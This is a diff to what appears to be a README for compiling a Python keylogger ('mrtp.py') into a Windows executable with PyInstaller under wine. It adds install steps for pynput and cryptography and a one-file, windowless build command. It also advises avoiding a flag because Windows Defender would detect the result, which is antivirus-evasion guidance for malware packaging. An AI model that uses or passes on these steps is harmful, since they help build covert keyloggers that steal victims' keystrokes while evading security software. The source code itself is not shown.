@@ -34,9 +34,14 @@ https://www.reddit.com/r/HowToHack/comments/ghfkrh/pyinstaller_getting_picked_up
 Read this before starting: https://arcade.academy/tutorials/bundling_with_pyinstaller/index.html
 Install the necessary imports with
 <code>
-wine ~/.wine/drive_c/Python27/python.exe -m pip install pynput==1.0 #This is example for the keylogger
+#This is example for the keylogger
+wine ~/.wine/drive_c/Python27/python.exe -m pip install pynput==1.0 
+wine ~/.wine/drive_c/Python27/python.exe -m pip install cryptography==3.3
 </code>
-wine ~/.wine/drive_c/Python27/python.exe -m PyInstaller --onefile  -w --icon=icon.ico --hidden-import=pynput mrtp.py 
+
+<code>
+wine ~/.wine/drive_c/Python27/python.exe -m PyInstaller --onefile  -w --hidden-import=pynput --hidden-import=cryptography mrtp.py
+</code>
 
 Do not use the --noconsole flag for pyinstaller cause Windows Defender will pick it up
 The exe-file is in the dist folder
